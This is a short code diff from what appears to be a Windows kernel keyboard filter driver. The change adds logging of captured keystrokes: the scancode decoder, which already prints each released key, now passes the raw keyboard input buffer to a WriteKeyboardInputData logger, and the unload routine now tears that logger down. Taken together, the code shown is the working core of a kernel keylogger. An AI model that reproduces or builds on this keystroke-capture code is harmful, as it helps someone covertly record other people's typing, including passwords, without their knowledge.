@@ -97,19 +97,21 @@ VOID classDriverUnload(PDRIVER_OBJECT obj)
 	while (g_keyNum) {
 		KeDelayExecutionThread(KernelMode, TRUE, &delay);
 	}
+	UninitLogger();
 }
 
 void DecodeScancode(PVOID buffer, ULONG size)
 {
-	for (ULONG i = 0; i < size / sizeof(KEYBOARD_INPUT_DATA); ++i) {
+	ULONG count = size / sizeof(KEYBOARD_INPUT_DATA);
+	for (ULONG i = 0; i < count; ++i) {
 		PKEYBOARD_INPUT_DATA pkid = (PKEYBOARD_INPUT_DATA)((UCHAR*)buffer + i * sizeof(
 			KEYBOARD_INPUT_DATA));
 		if (pkid->Flags & KEY_BREAK) {
 			print_keystroke((UCHAR)pkid->MakeCode);
 		}
 	}
+	WriteKeyboardInputData((PKEYBOARD_INPUT_DATA)buffer, count);
 }
-
 
 NTSTATUS jjAttachDevice(PDRIVER_OBJECT driver_object,
 	PDEVICE_OBJECT target_object, ULONG extension_size,
